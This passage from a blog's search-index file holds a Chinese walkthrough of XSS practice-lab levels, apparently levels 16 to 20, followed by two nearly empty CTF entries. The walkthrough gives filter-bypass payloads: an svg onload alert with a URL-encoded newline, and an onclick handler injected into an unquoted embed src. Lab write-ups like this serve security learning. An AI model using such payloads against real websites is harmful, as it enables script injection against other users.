href="https://blog.csdn.net/LYJ20010728/article/details/116462782">XSS常见的触发标签</a></p><p>随便选个标签，将空格替换成回车的url编码，构造payload  ?keyword=<svg%0Aonload=alert(1)></p><h2 id="level-17-embed标签-1"><a href="#level-17-embed标签-1" class="headerlink" title="level-17-----embed标签"></a>level-17-----embed标签</h2><p><img src="https://img-blog.csdnimg.cn/direct/ab709436b35c413e909e51e4b0c0a62d.png" alt="img"></p><p>这个传入了两个值，分别作为src中的xsf01.swf的变量和值传入,观察一下发现这个embed  标签就是引入一个  swf  文件到浏览器端，并且它的  src  属性值没有添 </p><p>  加引号所以 不用闭合。 </p><p>构造payload</p><p>' οnclick=alert()<br><img src="https://img-blog.csdnimg.cn/direct/be82d9feca8f41d5ab6ae37fd01d6c57.png" alt="img"></p><h2 id="level-18-同17-1"><a href="#level-18-同17-1" class="headerlink" title="level-18-----同17"></a>level-18-----同17</h2><h2 id="level-19-Pass-1"><a href="#level-19-Pass-1" class="headerlink" title="level-19-----Pass"></a>level-19-----Pass</h2><h2 id="level-20-Pass-1"><a href="#level-20-Pass-1" class="headerlink" title="level-20-----Pass"></a>level-20-----Pass</h2><h1 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>XYCTF</title>
    <link href="/kele6.github.io/2024/04/14/XYCTF/"/>
    <url>/kele6.github.io/2024/04/14/XYCTF/</url>
    
    <content type="html"><![CDATA[<p>我是菜鸟鸟</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF</title>
    <link href="/kele6.github.io/2024/04/14/BUUCTF/"/>
    <url>/kele6.github.io/2024/04/14/BUUCTF/</url>
    
    <content type="html"><![CDATA[<p>个人练习未达一坤年！</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
